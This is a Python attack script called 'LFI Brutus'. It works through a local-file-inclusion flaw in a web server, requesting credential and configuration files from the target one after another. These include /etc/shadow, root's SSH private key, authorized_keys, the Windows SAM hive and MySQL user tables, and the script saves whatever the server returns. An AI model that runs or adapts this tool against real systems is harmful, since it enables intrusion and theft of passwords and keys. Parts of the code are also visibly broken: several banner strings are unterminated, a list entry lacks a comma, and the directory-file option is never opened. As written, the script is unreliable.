import argparse
import requests
import urllib3

print("LFI Brutus)
print("|#        |#######  @@|#@@        )
print("|#        |#          |#          )
print("|#        |#          |#          )
print("|#        |#####      |#          )
print("|#        |#          |#          )
print("|#        |#          |#          )
print("|#######  |#       @@@|#@@@       )
parser = argparse.ArgumentParser(description='brute force common directories with a file-inclusion point')
parser.add_argument('host', type=str, help='IP address to scan. Example: 127.0.0.1')
parser.add_argument('path', type=str, help='Local file inclusion path. Example: /section.php?page=/../../../../..')
parser.add_argument('--nullbyte', action='store_true', default=True, help='terminate the url with null byte')
parser.add_argument('--ssl', action='store_true', default=False, help='Use SSL for connection (https)')
parser.add_argument('--dir-file', type=str, default=None, help='Input file for directory sweep')
parser.add_argument('--windows', action='store_true', default=False, help='Windows server')
parser.add_argument('--debug', action='store_true', default=False, help='Complete setup without running against host')
parser.add_argument('-v', '--verbose', action='store_true', default=False, help='Verbose output')
parser.add_argument('-k', '--verify-ssl', action='store_true', default=False, help='Verify SSL certificates')
parser.add_argument('-o', '--outfile', type=str, default=None, help="Write output to this file")
parser.add_argument('-s', '--surpress-output', action='store_true', default=True, help="Do not print results to screen")

args = parser.parse_args()
ssl = args.ssl
verify_ssl = args.verify_ssl
if not verify_ssl:
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

prefix = "https://" if ssl else "http://"
suffix = "%00" if args.nullbyte else ""
base_path = args.path
host = args.host
lfi_path_example = "{}{}{}<INJECTION POINT>{}".format(prefix, host, base_path, suffix)

verbose = args.verbose
debug = args.debug
surpress = args.surpress_output

outfile = args.outfile

if verbose:
    print("SSL Enabled: %s" % ssl)
    print("Verify SSL: %s" % verify_ssl)
    print("Host: %s" % host)
    print("Base Injection Path: %s" % base_path)
    print("Terminator: %s" % suffix)
    print("LFI path: %s" % lfi_path_example)

LINUX_FILES = [
    "/etc/passwd",
    "/etc/shadow",
    "/etc/issue",
    "/etc/group",
    "/etc/hostname",
    "/etc/ssh/ssh_config",
    "/etc/ssh/sshd_config",
    "/root/.ssh/id_rsa",
    "/root/.ssh/authorized_keys",
    # "/home/user/.ssh/authorized_keys",
    # "/home/user/.ssh/id_rsa",
    "/etc/apache2/apache2.conf",
    "/usr/local/etc/apache2/httpd.conf",
    "/etc/httpd/conf/httpd.conf",
    "/var/log/httpd/access_log",
    "/var/log/apache2/access.log",
    "/var/log/httpd-access.log",
    "/var/log/apache/access.log",
    "/var/log/apache/error.log",
    "/var/log/apache2/access.log",
    "/var/log/apache/error.log",
    "/var/lib/mysql/mysql/usr.frm",
    "/var/lib/mysql/user.MYD",
    "/var/lib/mysql/user.MYI"
]

WINDOWS_FILES = [
    "/boot.ini",
    "/autoexec.bat",
    "/windows/system32/drivers/etc/hosts",
    "/windows/repair/SAM"
    "/windows/panther/unattended.xml",
    "/windows/panther/unattend/unattended.xml"
]

if args.dir_file:
    files = args.dir_file
elif args.windows:
    files = WINDOWS_FILES
else:
    files = LINUX_FILES

if verbose:
    print("Loaded %d files" % len(files))

session = requests.Session()
files_processed = 0.0
for f in files:
    url = "{}{}{}{}{}".format(prefix, host, base_path, f, suffix)
    if verbose:
        percent_complete = (float(files_processed) / float(len(files))) * 100
        print("Progress: %d%%" % percent_complete)
        print("Testing {}".format(url))
    if debug:
        files_processed += 1
        continue
    resp = session.get(url, verify=verify_ssl)
    if resp.content and resp.status_code != 404:
        if verbose and not surpress:
            print(resp.content)
        if outfile:
            with open(outfile, 'a+') as output:
                output.write("##############################")
                output.write("Results for: {}".format(f))
                output.write(resp.content)
    files_processed += 1
print("Done!")